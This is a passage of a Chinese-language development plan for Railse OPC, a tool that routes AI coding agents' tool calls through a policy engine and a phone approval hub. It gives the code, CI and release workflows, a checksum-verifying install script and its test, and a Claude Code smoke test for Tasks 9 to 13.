	if s.cfg.ACMEHTTPListen != "none" {
		httpSrv := &http.Server{Addr: s.cfg.ACMEHTTPListen, Handler: s.acmeManager().HTTPHandler(nil), ReadHeaderTimeout: 10 * time.Second, ReadTimeout: 30 * time.Second, IdleTimeout: idleTimeout}
		httpDone := make(chan error, 1)
		go func() { httpDone <- httpSrv.ListenAndServe() }()
		defer func() {
			shutdownCtx, c := context.WithTimeout(context.Background(), shutdownTimeout)
			defer c()
			httpSrv.Shutdown(shutdownCtx)
		}()
		go func() {
			if err := <-httpDone; err != nil && !errors.Is(err, http.ErrServerClosed) {
				s.log.Printf("ACME 挑战端口 %s: %v（证书签发与 http 跳转不可用，hub 本身照常）", s.cfg.ACMEHTTPListen, err)
			}
		}()
	}
	s.log.Printf("直出 TLS：域名 %s，证书目录 %s", s.cfg.ACMEDomain, s.cfg.ACMECacheDir)
	return s.serve(ctx, tls.NewListener(ln, s.tlsConfig()))
}
```
（`ErrListen`、`idleTimeout`、`shutdownTimeout`、`serve` 是第 3 份已有的。`serve` 里 `http.Server.Addr` 用的是 `cfg.Listen`，只作日志用途，不影响。）

`cmd/railse/hub.go`：
- 标志 `acmeDomain := fs.String("acme-domain", "", "hub 自己申请 Let's Encrypt 证书并直出 TLS 的域名（需要 443/80 端口）")`、`acmeEmail := fs.String("acme-email", "", "给 Let's Encrypt 的联系邮箱（可选）")`、`acmeHTTP := fs.String("acme-http", ":80", "HTTP-01 挑战与 http→https 跳转的监听地址；none 不监听")`；`hubFlags["run"]` 加三个。
- 抽出 `hubConfigFromArgs(args []string, stderr io.Writer) (hub.Config, int)`：解析标志并组 `cfg`，`--acme-domain` 非空且 `--listen` 空时 `cfg.Listen = ":443"`；`cfg.ACMEDomain/ACMEEmail/ACMEHTTPListen` 赋值；域名格式先用与 `hub` 包相同的正则校验，不对就打印“--acme-domain 必须是小写主机名”退出 2。
- 用法文本加一行 `railse hub run --acme-domain hub.example.com [--acme-email me@example.com] [--acme-http :80]   直出 TLS（Let's Encrypt），监听默认 :443；需要 root 或 CAP_NET_BIND_SERVICE（railse setup autostart --hub --system 会加）`。
- `runHubServe` 日志：ACME 启用时打印域名与证书目录。

`docs/hub.md`：“部署与反向代理”改为两种部署方式：A. 内置 ACME 直出（推荐自用）：`railse hub run --acme-domain hub.example.com`（443/80 开放，域名已解析到这台机器；首次签发需要 1 到 2 分钟；证书与账户私钥在 `acme/`，0700）；B. 反向代理（原文）。“安全要点”加 ACME 目录。

- [ ] **Step 4: 跑测试确认通过**

Run: `make test`
Expected: 全过。

- [ ] **Step 5: 提交**

```bash
git add internal/hub/acme.go internal/hub/acme_test.go internal/hub/server.go cmd/railse/hub.go cmd/railse/hub_test.go docs/hub.md
git commit -m "feat(hub): 内置 ACME 直出 TLS（autocert），--acme-domain/--acme-email/--acme-http"
```

---

### Task 10: 仓库基础：LICENSE、README、`go.mod` 忽略 `web/node_modules`、golangci-lint、Makefile 的 lint 与发布检查

**Files:**
- Create: `LICENSE`、`README.md`、`.golangci.yml`
- Modify: `go.mod`、`Makefile`
- Modify: 任何 lint 报出的 Go 文件

**Interfaces:**
- `make lint`：`go run github.com/golangci/golangci-lint/v2/cmd/golangci-lint@v2.4.0 run ./...`（版本不存在时用 `go list -m -versions github.com/golangci/golangci-lint/v2` 列出的最近 v2 版本并改 Makefile）
- `make release-check`：`go run github.com/goreleaser/goreleaser/v2@latest check`（Task 12 用）
- `make test` 加 `lint`
- `.golangci.yml`（v2 格式）：`linters.default: standard`（errcheck、govet、ineffassign、staticcheck、unused），`linters.exclusions.presets: [common-false-positives, std-error-handling]`，`formatters.enable: [gofmt]`

- [ ] **Step 1: 加文件**

```bash
curl -fsSL https://www.apache.org/licenses/LICENSE-2.0.txt -o LICENSE && head -3 LICENSE
go mod edit -ignore=./web/node_modules && grep -n "^ignore" go.mod
```
Expected: `LICENSE` 第一行含 `Apache License`；`go.mod` 多出 `ignore ./web/node_modules`。

`.golangci.yml`:
```yaml
version: "2"
linters:
  default: standard
  exclusions:
    presets:
      - common-false-positives
      - std-error-handling
formatters:
  enable:
    - gofmt
```

`README.md`（中文，约 60 行）：
1. 一句话：Railse 一人公司（Railse OPC）用策略引擎自动审批 AI 编程 agent（Claude Code、Codex CLI、Gemini CLI）的工具调用，定不了的进手机收件箱。状态：第一版自用中，未发布正式版。
2. 怎么工作：三段（钩子 → 守护进程与策略引擎 → hub 与手机网页），一张 ASCII 流程。
3. 安装：`curl -fsSL https://raw.githubusercontent.com/railse/railse-opc/main/install.sh | sh`（Task 12 提供）；或 `go install github.com/railse/railse-opc/cmd/railse@latest`（没有网页，网页路径回 503）。
4. 三步上手：hub 机器 `railse hub password && railse hub token && railse hub run --acme-domain …`（或 `railse setup autostart --hub --system -- --acme-domain …`）；每台工作机 `railse setup all --hub https://… --token …`；手机打开网页。
5. 文档索引：`docs/setup.md`、`docs/agent-local-loop.md`、`docs/hub.md`、`docs/web.md`、设计文档。
6. 开发：`make test`、`make e2e`、`make lint`、`make build`。
7. 许可证 Apache 2.0。

`Makefile` 加：
```make
lint:
	go run github.com/golangci/golangci-lint/v2/cmd/golangci-lint@v2.4.0 run ./...

release-check:
	go run github.com/goreleaser/goreleaser/v2@latest check
```
并把 `test:` 的依赖改为 `test: gofmt lint`。

- [ ] **Step 2: 跑 lint 并修到干净**

Run: `make lint`
Expected: 首次可能报若干 errcheck/staticcheck；逐条修（真正的错误处理缺口改代码，确属无害的用 `_ =` 显式忽略并加一句注释），不要靠放宽配置。修完 `make lint` 无输出退出 0。

- [ ] **Step 3: 跑全量并提交**

Run: `make test`
Expected: 全过。

```bash
git add LICENSE README.md .golangci.yml go.mod Makefile $(git diff --name-only)
git commit -m "chore: LICENSE（Apache 2.0）、README、golangci-lint 配置与修复、go.mod 忽略 web/node_modules"
```

---

### Task 11: GitHub Actions CI 与端到端加固

**Files:**
- Create: `.github/workflows/ci.yml`
- Modify: `web/e2e/global-setup.ts`、`web/playwright.config.ts`

**Interfaces:**
- CI 工作流 `ci`：`push`（`main`）与 `pull_request` 触发；四个作业：
  - `go`：`actions/checkout@v4`、`actions/setup-go@v5`（`go-version-file: go.mod`）、`make gofmt`、`go vet ./...`、`make lint`、`go test ./... -race -count=1`
  - `web`：`actions/setup-node@v4`（`node-version: 20`，`cache: npm`，`cache-dependency-path: web/package-lock.json`）、`cd web && npm ci && npm run check && npm run build`
  - `e2e`：Go + Node，`cd web && npx playwright install --with-deps chromium`，`make e2e`；失败时 `actions/upload-artifact@v4` 上传 `web/test-results`
  - `cross`：矩阵 `{darwin/arm64, linux/amd64, linux/arm64}`，`make web` 后 `CGO_ENABLED=0 GOOS=… GOARCH=… go build -o /tmp/railse ./cmd/railse`
- e2e 加固：`global-setup.ts` 把 hub 与守护进程的 stdout/stderr 写到 `.e2e/hub.log`、`.e2e/agent.log`；hub 进程在就绪前退出时立即抛错并附日志末 30 行（不再换端口重试，除非 stderr 含 `address already in use`，这种才换端口，最多 3 次）；每一步等待有明确超时（已就绪 10 秒、socket 10 秒）；`playwright.config.ts` 加 `globalTimeout: 10 * 60 * 1000`、`reporter: [['list'], ['html', { open: 'never' }]]`

- [ ] **Step 1: 写工作流与加固**

`.github/workflows/ci.yml`:
```yaml
name: ci
on:
  push:
    branches: [main]
  pull_request:
permissions:
  contents: read
jobs:
  go:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - run: make gofmt
      - run: go vet ./...
      - run: make lint
      - run: go test ./... -race -count=1
  web:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: web/package-lock.json
      - run: cd web && npm ci && npm run check && npm run build
  e2e:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: web/package-lock.json
      - run: cd web && npm ci && npx playwright install --with-deps chromium
      - run: make e2e
      - if: failure()
        uses: actions/upload-artifact@v4
        with:
          name: e2e-results
          path: |
            web/test-results
            web/.e2e/*.log
  cross:
    runs-on: ubuntu-latest
    strategy:
      matrix:
        include:
          - { goos: darwin, goarch: arm64 }
          - { goos: linux, goarch: amd64 }
          - { goos: linux, goarch: arm64 }
    steps:
      - uses: actions/checkout@v4
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: web/package-lock.json
      - run: make web
      - run: CGO_ENABLED=0 GOOS=${{ matrix.goos }} GOARCH=${{ matrix.goarch }} go build -o /tmp/railse ./cmd/railse
```

`web/e2e/global-setup.ts` 改动点（在现有代码上改，保留其余逻辑）：
```ts
import { createWriteStream } from 'node:fs'

function spawnLogged(name: string, args: string[], logPath: string): ChildProcess {
  const log = createWriteStream(logPath, { flags: 'a' })
  const child = spawn(bin, args, { stdio: ['ignore', 'pipe', 'pipe'] })
  child.stdout?.pipe(log)
  child.stderr?.pipe(log)
  return child
}

// 等 hub 就绪；它在就绪前退出就立刻失败并附日志，只有“端口被占”才换端口重试
async function startHub(hubDir: string, logPath: string): Promise<{ proc: ChildProcess; port: number }> {
  for (let attempt = 0; attempt < 3; attempt++) {
    const port = await freePort()
    const proc = spawnLogged('hub', ['hub', 'run', '--dir', hubDir, '--listen', `127.0.0.1:${port}`], logPath)
    let exited: { code: number | null } | null = null
    proc.once('exit', (code) => { exited = { code } })
    const until = Date.now() + 10_000
    while (Date.now() < until) {
      if (exited) break
      try {
        const r = await fetch(`http://127.0.0.1:${port}/api/version`)
        if (r.ok) return { proc, port }
      } catch {
        // 还没起来
      }
      await new Promise((r) => setTimeout(r, 100))
    }
    const tail = readFileSync(logPath, 'utf8').split('\n').slice(-30).join('\n')
    if (exited && /address already in use/.test(tail)) {
      continue
    }
    proc.kill('SIGTERM')
    throw new Error(`hub 没有在 10 秒内就绪（退出码 ${exited ? (exited as { code: number | null }).code : '未退出'}）。日志末尾：\n${tail}`)
  }
  throw new Error('hub 端口连续三次被占')
}
```
守护进程同样用 `spawnLogged('agent', […], '.e2e/agent.log')`，socket 等待 10 秒超时时附 `agent.log` 末 30 行。`playwright.config.ts` 加 `globalTimeout: 10 * 60 * 1000` 与 `reporter: [['list'], ['html', { open: 'never' }]]`。

- [ ] **Step 2: 本地校验**

Run: `ruby -ryaml -e 'YAML.load_file(ARGV[0]); puts "yaml ok"' .github/workflows/ci.yml && make e2e`
Expected: `yaml ok`；端到端仍过；`web/.e2e/hub.log` 与 `agent.log` 生成（已被 `web/.gitignore` 的 `.e2e/` 忽略）。手工验证崩溃可见性：临时把 `hub run` 的 `--dir` 指向一个不可写路径跑一次 `npx playwright test`，应在 10 秒内失败并打印 hub 日志末尾；验完改回。

- [ ] **Step 3: 提交**

```bash
git add .github/workflows/ci.yml web/e2e/global-setup.ts web/playwright.config.ts
git commit -m "ci: GitHub Actions（Go 竞态测试与 lint、网页检查、Playwright、三平台交叉编译）；端到端起 hub 失败即报并附日志"
```

---

### Task 12: 发布：goreleaser、release 工作流、`install.sh` 与它的本地测试

**Files:**
- Create: `.goreleaser.yaml`、`.github/workflows/release.yml`、`install.sh`、`scripts/test-install.sh`
- Modify: `.gitignore`（加 `/dist/` 已有；加 `/web/.e2e/`）

**Interfaces:**
- goreleaser v2：`before.hooks: [make web]`；一个 build（`./cmd/railse`，`CGO_ENABLED=0`，`darwin/arm64`、`linux/amd64`、`linux/arm64`，`-s -w -X main.version={{.Version}}`，`mod_timestamp`）；归档 `tar.gz`，名 `railse_{{ .Version }}_{{ .Os }}_{{ .Arch }}`，含 `LICENSE`、`README.md`、`docs/*.md`；`checksums.txt`；changelog 排除 `^docs`、`^test`、`^chore`、`^ci`；`release.github` 为 `railse/railse-opc`，`prerelease: auto`
- `release.yml`：`push` 到 `v*` tag 触发；`permissions: contents: write`；checkout `fetch-depth: 0`；setup Go 与 Node；`goreleaser/goreleaser-action@v6`（`version: '~> v2'`，`args: release --clean`，`GITHUB_TOKEN`）
- `install.sh`（POSIX sh）：环境变量 `RAILSE_REPO`（默认 `railse/railse-opc`）、`RAILSE_VERSION`（默认最新）、`RAILSE_INSTALL_DIR`（默认 `/usr/local/bin`，不可写时 `~/.local/bin`）、`RAILSE_BASE_URL`（默认 `https://github.com/$RAILSE_REPO/releases/download/v$VERSION`，测试用）；流程：检测 `uname -s/-m` → `darwin/arm64`、`linux/amd64`、`linux/arm64`，其他报错；版本为最新时从 `https://github.com/$RAILSE_REPO/releases/latest/download/checksums.txt` 取文件名里的版本号；下载 `checksums.txt` 与对应 tar.gz 到临时目录；`sha256sum` 或 `shasum -a 256` 校验；解包；`install -m 755 railse $DIR/railse`（目录不可写且有 sudo 时提示并用 sudo）；打印 `railse version` 与下一步（`railse setup all …`、`railse doctor`）
- `scripts/test-install.sh`：本地造一个假发布（`go build` 当前代码、打包成 `railse_0.0.1_<os>_<arch>.tar.gz`、生成 `checksums.txt`），用 `python3 -m http.server` 在随机端口提供，`RAILSE_BASE_URL=http://127.0.0.1:端口 RAILSE_VERSION=0.0.1 RAILSE_INSTALL_DIR=<临时目录> sh install.sh`，断言装出的 `railse version` 输出含 `railse`；再把 checksums 改坏一位，断言 install.sh 失败退出且不安装

- [ ] **Step 1: 写配置与脚本**

`.goreleaser.yaml`:
```yaml
version: 2
project_name: railse
before:
  hooks:
    - make web
builds:
  - id: railse
    main: ./cmd/railse
    binary: railse
    env:
      - CGO_ENABLED=0
    goos: [darwin, linux]
    goarch: [amd64, arm64]
    ignore:
      - goos: darwin
        goarch: amd64
    ldflags:
      - -s -w -X main.version={{ .Version }}
    mod_timestamp: "{{ .CommitTimestamp }}"
archives:
  - id: tar
    formats: [tar.gz]
    name_template: "{{ .ProjectName }}_{{ .Version }}_{{ .Os }}_{{ .Arch }}"
    files:
      - LICENSE
      - README.md
      - docs/*.md
checksum:
  name_template: checksums.txt
changelog:
  sort: asc
  filters:
    exclude:
      - "^docs"
      - "^test"
      - "^chore"
      - "^ci"
release:
  github:
    owner: railse
    name: railse-opc
  prerelease: auto
```
（goreleaser 2.6 之前的版本用 `format: tar.gz` 而不是 `formats`；`make release-check` 报不认识的键时按它的提示改。）

`.github/workflows/release.yml`:
```yaml
name: release
on:
  push:
    tags: ["v*"]
permissions:
  contents: write
jobs:
  release:
    runs-on: ubuntu-latest
    steps:
      - uses: actions/checkout@v4
        with:
          fetch-depth: 0
      - uses: actions/setup-go@v5
        with:
          go-version-file: go.mod
      - uses: actions/setup-node@v4
        with:
          node-version: 20
          cache: npm
          cache-dependency-path: web/package-lock.json
      - uses: goreleaser/goreleaser-action@v6
        with:
          distribution: goreleaser
          version: "~> v2"
          args: release --clean
        env:
          GITHUB_TOKEN: ${{ secrets.GITHUB_TOKEN }}
```

`install.sh`:
```sh
#!/bin/sh
# Railse 一行安装：curl -fsSL https://raw.githubusercontent.com/railse/railse-opc/main/install.sh | sh
# 环境变量：RAILSE_REPO（默认 railse/railse-opc）、RAILSE_VERSION（默认最新）、RAILSE_INSTALL_DIR（默认 /usr/local/bin）、
#          RAILSE_BASE_URL（下载根地址，默认 GitHub Releases；测试用）
set -eu

REPO="${RAILSE_REPO:-railse/railse-opc}"
VERSION="${RAILSE_VERSION:-}"
INSTALL_DIR="${RAILSE_INSTALL_DIR:-/usr/local/bin}"

fail() { printf '安装失败：%s\n' "$1" >&2; exit 1; }

os="$(uname -s | tr '[:upper:]' '[:lower:]')"
arch="$(uname -m)"
case "$os" in darwin|linux) ;; *) fail "不支持的系统 $os（只支持 macOS 与 Linux）";; esac
case "$arch" in
  x86_64|amd64) arch=amd64 ;;
  arm64|aarch64) arch=arm64 ;;
  *) fail "不支持的架构 $arch" ;;
esac
[ "$os" = darwin ] && [ "$arch" = amd64 ] && fail "不提供 macOS Intel 的包（只支持 Apple Silicon）"

command -v curl >/dev/null || fail "需要 curl"
if command -v sha256sum >/dev/null; then SHA="sha256sum"; elif command -v shasum >/dev/null; then SHA="shasum -a 256"; else fail "需要 sha256sum 或 shasum"; fi

if [ -z "$VERSION" ]; then
  # 最新版：latest/download 会跳到最新 tag 的产物，从文件名里取版本号
  line="$(curl -fsSL "https://github.com/$REPO/releases/latest/download/checksums.txt" | head -1)" || fail "取不到最新版本（没有发布过？）"
  VERSION="$(printf '%s\n' "$line" | sed -n 's/.*railse_\([0-9][^_]*\)_.*/\1/p')"
  [ -n "$VERSION" ] || fail "解析不出最新版本号：$line"
fi
BASE="${RAILSE_BASE_URL:-https://github.com/$REPO/releases/download/v$VERSION}"
FILE="railse_${VERSION}_${os}_${arch}.tar.gz"

tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"' EXIT
printf '下载 %s/%s\n' "$BASE" "$FILE"
curl -fsSL "$BASE/$FILE" -o "$tmp/$FILE" || fail "下载 $FILE 失败"
curl -fsSL "$BASE/checksums.txt" -o "$tmp/checksums.txt" || fail "下载 checksums.txt 失败"
expected="$(grep " $FILE\$" "$tmp/checksums.txt" | awk '{print $1}')"
[ -n "$expected" ] || fail "checksums.txt 里没有 $FILE"
actual="$(cd "$tmp" && $SHA "$FILE" | awk '{print $1}')"
[ "$expected" = "$actual" ] || fail "校验和不符：期望 $expected，实际 $actual"
tar -xzf "$tmp/$FILE" -C "$tmp" railse || fail "解包失败"

if [ ! -w "$INSTALL_DIR" ]; then
  if [ -z "${RAILSE_INSTALL_DIR:-}" ]; then
    INSTALL_DIR="$HOME/.local/bin"
    mkdir -p "$INSTALL_DIR"
    printf '%s 不可写，改装到 %s（请确认它在 PATH 里）\n' "/usr/local/bin" "$INSTALL_DIR"
  else
    fail "$INSTALL_DIR 不可写"
  fi
fi
install -m 755 "$tmp/railse" "$INSTALL_DIR/railse" || fail "写入 $INSTALL_DIR 失败"
printf '已安装 %s/railse：' "$INSTALL_DIR"
"$INSTALL_DIR/railse" version
printf '\n下一步：\n  工作机：railse setup all --hub https://<hub 域名> --token <接入码>\n  hub 机器：railse hub password && railse hub run --acme-domain <域名>\n  体检：railse doctor\n'
```

`scripts/test-install.sh`:
```bash
#!/usr/bin/env bash
# 本地测试 install.sh：用当前代码造一个假发布，起本地 HTTP 服务，走完下载、校验、安装；再验证校验失败时拒装。
set -euo pipefail
cd "$(dirname "$0")/.."
tmp="$(mktemp -d)"
trap 'rm -rf "$tmp"; kill ${HTTP_PID:-0} 2>/dev/null || true' EXIT
os="$(uname -s | tr '[:upper:]' '[:lower:]')"; arch="$(uname -m)"; case "$arch" in x86_64) arch=amd64;; arm64|aarch64) arch=arm64;; esac
mkdir -p "$tmp/rel" "$tmp/pkg" "$tmp/bin"
go build -ldflags "-X main.version=0.0.1" -o "$tmp/pkg/railse" ./cmd/railse
cp LICENSE README.md "$tmp/pkg/"
tar -czf "$tmp/rel/railse_0.0.1_${os}_${arch}.tar.gz" -C "$tmp/pkg" railse LICENSE README.md
(cd "$tmp/rel" && { command -v sha256sum >/dev/null && sha256sum *.tar.gz || shasum -a 256 *.tar.gz; } > checksums.txt)
port=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')
(cd "$tmp/rel" && python3 -m http.server "$port" --bind 127.0.0.1 >/dev/null 2>&1) & HTTP_PID=$!
for _ in $(seq 1 50); do curl -fs "http://127.0.0.1:$port/checksums.txt" >/dev/null && break; sleep 0.1; done
RAILSE_BASE_URL="http://127.0.0.1:$port" RAILSE_VERSION=0.0.1 RAILSE_INSTALL_DIR="$tmp/bin" sh install.sh
"$tmp/bin/railse" version | grep -q "railse 0.0.1" || { echo "FAIL: 装出的版本不对"; exit 1; }
# 校验失败必须拒装
sed -i.bak 's/^./0/' "$tmp/rel/checksums.txt"
rm -f "$tmp/bin/railse"
if RAILSE_BASE_URL="http://127.0.0.1:$port" RAILSE_VERSION=0.0.1 RAILSE_INSTALL_DIR="$tmp/bin" sh install.sh 2>"$tmp/err"; then
  echo "FAIL: 校验和不符仍然安装了"; exit 1
fi
grep -q "校验和不符" "$tmp/err" || { echo "FAIL: 错误原因不对"; cat "$tmp/err"; exit 1; }
[ ! -e "$tmp/bin/railse" ] || { echo "FAIL: 校验失败不应留下二进制"; exit 1; }
echo "OK: install.sh 下载、校验、安装与拒装都正确"
```
`chmod +x install.sh scripts/test-install.sh`。`.gitignore` 加 `/web/.e2e/`。

- [ ] **Step 2: 校验与测试**

Run: `ruby -ryaml -e 'YAML.load_file(ARGV[0]); puts "yaml ok"' .github/workflows/release.yml && make release-check && scripts/test-install.sh`
Expected: `yaml ok`；goreleaser `check` 通过（它会读 `.goreleaser.yaml`，不需要 GitHub 凭据）；安装脚本测试打印 `OK`。

本地出一次快照包确认交叉编译与归档内容：`go run github.com/goreleaser/goreleaser/v2@latest release --snapshot --clean --skip=publish && ls dist/ && tar -tzf dist/railse_*_linux_arm64.tar.gz`，Expected: 三个 tar.gz 加 `checksums.txt`，包内有 `railse`、`LICENSE`、`README.md`、`docs/`。`dist/` 已在 `.gitignore`。

- [ ] **Step 3: 提交**

```bash
git add .goreleaser.yaml .github/workflows/release.yml install.sh scripts/test-install.sh .gitignore
git commit -m "release: goreleaser 三平台出包与 GitHub Release 工作流；install.sh 一行安装（校验和）及其本地测试"
```

---

### Task 13: 真实 Claude Code 经 hub 的冒烟、文档收尾、设计文档更新

**Files:**
- Create: `scripts/smoke-claude-hub.sh`
- Create: `docs/setup.md`
- Modify: `docs/hub.md`（开机自启与 doctor 的引用）、`docs/agent-local-loop.md`（指向 setup.md）、`README.md`（文档索引）
- Modify: `docs/superpowers/specs/2026-10-21-railse-opc-design.md`（§0.6 加第 5 份决策行；§1.3 加 `internal/doctor/`、`internal/hooksconf/`、`install.sh`、`.github/`）

**Interfaces:**
- `scripts/smoke-claude-hub.sh`：真实 `claude -p` 经守护进程 → hub → 自动用 REST 批准 → 钩子放行。步骤：构建；临时 `RAILSE_HUB_HOME` 起 hub（随机端口、密码 `smoke-password-1`、接入码）；临时 `RAILSE_HOME` 接入并起守护进程；临时项目 `git init` 并 `setup hooks --claude`；后台用 curl 登录（cookie 文件 0600）轮询 `/api/inbox`，出现 pending 就 `POST /api/requests/{id}/decide {"action":"allow"}`；前台跑 `claude -p "Run exactly this shell command with the Bash tool and nothing else: git push origin main . Then reply DONE."`（没有远端，命令本身会失败，但审批链路已走完）；断言：hub 里该请求 `approved`、`decided_by user`、`delivered_at` 非空（经 `GET /api/requests/{id}`），本机审计有 `"state":"approved"`；120 秒超时；失败时保留临时目录并打印 hub.log、agent.log 末尾。不进 CI，发布前手动跑。
- `docs/setup.md`：安装（一行脚本、校验和、换安装目录、升级就是重跑脚本、卸载）；hub 机器的三条命令与两种 TLS 方式；工作机 `railse setup all` 做了什么、各子命令（`hooks`、`autostart`、`agent enroll`）单独怎么用；`railse doctor` 各检查项的含义与修复；开机自启在 macOS/Linux 的位置、看日志、卸载；升级流程（重跑安装脚本，重启守护进程：`railse setup autostart` 会重新 bootstrap；hub 用 `systemctl restart`）；发布流程（维护者：打 tag `vX.Y.Z` 推送即出包，CI 要绿）。

- [ ] **Step 1: 写冒烟脚本**

`scripts/smoke-claude-hub.sh`:
```bash
#!/usr/bin/env bash
# 真实 Claude Code 经 hub 审批的冒烟：守护进程把 git push 送到 hub，脚本用 REST 当“手机”批准，钩子放行。
# 需要本机已装 claude 且已登录。不进 CI，发布前手动跑。
set -uo pipefail
ROOT="$(cd "$(dirname "$0")/.." && pwd)"
WORK="$(mktemp -d /tmp/railse-smoke-hub.XXXX)"
export RAILSE_HUB_HOME="$WORK/hub" RAILSE_HOME="$WORK/home"
PW="smoke-password-1"
command -v claude >/dev/null || { echo "FAIL: 没有找到 claude"; exit 1; }
cd "$ROOT" && go build -o "$WORK/railse" ./cmd/railse || exit 1
R="$WORK/railse"
port=$(python3 -c 'import socket; s=socket.socket(); s.bind(("127.0.0.1",0)); print(s.getsockname()[1])')
HUB="http://127.0.0.1:$port"
printf '%s\n' "$PW" | "$R" hub password >/dev/null || exit 1
"$R" hub run --listen "127.0.0.1:$port" --foreground >"$WORK/hub.out" 2>&1 &
HUB_PID=$!
cleanup() { kill ${AGENT_PID:-0} $HUB_PID ${APPROVER_PID:-0} 2>/dev/null || true; }
trap cleanup EXIT
for _ in $(seq 1 50); do curl -fs "$HUB/api/version" >/dev/null && break; sleep 0.1; done
curl -fs "$HUB/api/version" >/dev/null || { echo "FAIL: hub 没起来"; tail -30 "$WORK/hub.out"; exit 1; }
TOKEN="$("$R" hub token | sed -n 's/^接入码: //p')"
"$R" agent enroll --hub "$HUB" --token "$TOKEN" --name smoke >/dev/null || exit 1
"$R" agent run --foreground >"$WORK/agent.out" 2>&1 &
AGENT_PID=$!
for _ in $(seq 1 50); do [ -S "$RAILSE_HOME/agent.sock" ] && break; sleep 0.1; done
[ -S "$RAILSE_HOME/agent.sock" ] || { echo "FAIL: 守护进程没起来"; tail -30 "$WORK/agent.out"; exit 1; }
mkdir -p "$WORK/proj" && (cd "$WORK/proj" && git init -q)
"$R" setup hooks --project "$WORK/proj" --claude --bin "$R" >/dev/null || exit 1
# “手机”：登录后轮询收件箱，见到 pending 就批准
CK="$WORK/cookie"; : >"$CK"; chmod 600 "$CK"
printf '{"password":"%s"}' "$PW" | curl -fs -c "$CK" -H 'Content-Type: application/json' --data-binary @- "$HUB/api/login" || { echo "FAIL: 登录失败"; exit 1; }
(
  for _ in $(seq 1 600); do
    id="$(curl -fs -b "$CK" "$HUB/api/inbox" | python3 -c 'import sys,json; p=json.load(sys.stdin)["pending"]; print(p[0]["id"] if p else "")')"
    if [ -n "$id" ]; then
      curl -fs -b "$CK" -H 'Content-Type: application/json' -H "Origin: $HUB" -d '{"action":"allow","note":"冒烟自动批准"}' "$HUB/api/requests/$id/decide" >/dev/null
      echo "$id" >"$WORK/approved-id"; exit 0
    fi
    sleep 0.2
  done
) &
APPROVER_PID=$!
(cd "$WORK/proj" && env -i HOME="$HOME" PATH="$PATH" USER="${USER:-$(id -un)}" LOGNAME="${LOGNAME:-$(id -un)}" \
  TMPDIR="${TMPDIR:-/tmp}" SHELL="${SHELL:-/bin/sh}" LANG="${LANG:-C}" TERM=dumb RAILSE_HOME="$RAILSE_HOME" \
  timeout 120 claude -p "Run exactly this shell command with the Bash tool and nothing else: git push origin main . Then reply DONE." \
  --setting-sources project,local --output-format json < /dev/null > "$WORK/claude.json")
echo "== claude 输出 =="; cat "$WORK/claude.json"; echo
wait $APPROVER_PID 2>/dev/null
id="$(cat "$WORK/approved-id" 2>/dev/null || true)"
[ -n "$id" ] || { echo "FAIL: hub 里没出现待审批（120 秒）"; tail -30 "$WORK/agent.out"; exit 1; }
state="$(curl -fs -b "$CK" "$HUB/api/requests/$id" | python3 -c 'import sys,json; r=json.load(sys.stdin)["request"]; print(r["state"], r["decided_by"], "delivered" if r["delivered_at"] else "undelivered")')"
echo "== hub 里的请求: $state =="
if [ "$state" = "approved user delivered" ] && grep -q '"state":"approved"' "$RAILSE_HOME/audit.jsonl"; then
  echo "OK: 请求经 hub 批准并送回钩子"; exit 0
fi
echo "FAIL: 状态不对（临时目录保留在 $WORK）"; tail -30 "$WORK/hub.out"; tail -30 "$WORK/agent.out"; exit 1
```
（macOS 没有 `timeout` 时用 `gtimeout`（coreutils）或去掉 `timeout` 直接依赖 claude 自己结束；脚本开头检测 `command -v timeout || timeout() { shift; "$@"; }`。`--setting-sources project,local` 让 claude 读 `settings.local.json`；若 Task 4 实测只用 `project` 也读得到，两者保持一致。）

- [ ] **Step 2: 跑冒烟**

Run: `scripts/smoke-claude-hub.sh`
Expected: 打印 `OK: 请求经 hub 批准并送回钩子`。这是本计划唯一需要真实 Claude Code 登录态的步骤；跑不了（没登录、没网）就记进 progress.md，由作者本人跑。

- [ ] **Step 3: 写文档与设计文档更新**

`docs/setup.md` 按接口段的提纲写（约 150 行，中文，命令都给完整形式）。`docs/hub.md`：“启动”一节加 `railse setup autostart --hub --system -- --acme-domain …` 与 `railse doctor --hub-dir`；“故障排查”第一行改为“先跑 `railse doctor`”。`docs/agent-local-loop.md` 开头加“安装与接入见 `docs/setup.md`”。`README.md` 文档索引加 `docs/setup.md`。

设计文档：
- §0.6 加一行 `| 第 5 份计划执行前的决策（2026-10-24） | 推送订阅删除要连续失败且满 24 小时（第 4 份）；连续 3 次 401 才停用守护进程的 hub 连接；Claude 钩子写 .claude/settings.local.json（已改）；ACME 只用 autocert 直出，证书与账户私钥明文存数据目录 acme/（出站与签名密钥例外）；hub 机器的系统单元用 AmbientCapabilities 绑 443/80，不以 root 运行 hub；MCP 参数里的命令字段按命令行语境脱敏。 |`
- §1.3 加 `internal/doctor/     # railse doctor 的检查项`、`internal/hooksconf/  # 三个 CLI 钩子配置的生成、合并与检查`、`install.sh           # 一行安装`、`.github/workflows/   # CI 与发布`。
- §5.5 后加一句“检查项的完整清单与修复提示见 `docs/setup.md`”。

- [ ] **Step 4: 全量验证并提交**

Run: `make test && make e2e && make release-check`
Expected: 全过。

```bash
git add scripts/smoke-claude-hub.sh docs/setup.md docs/hub.md docs/agent-local-loop.md README.md docs/superpowers/specs/2026-10-21-railse-opc-design.md
git commit -m "test: 真实 Claude Code 经 hub 审批的冒烟；docs: 安装与接入文档、设计文档更新"
```

---

## 完成标准

全部满足才算第 5 份计划完成：

1. `make test`（gofmt、lint、vet、Go 竞态测试、网页检查）、`make e2e`、`make release-check`、`scripts/test-install.sh` 全过；`go.mod` 没有新增 `require`（只多 `ignore ./web/node_modules`）。
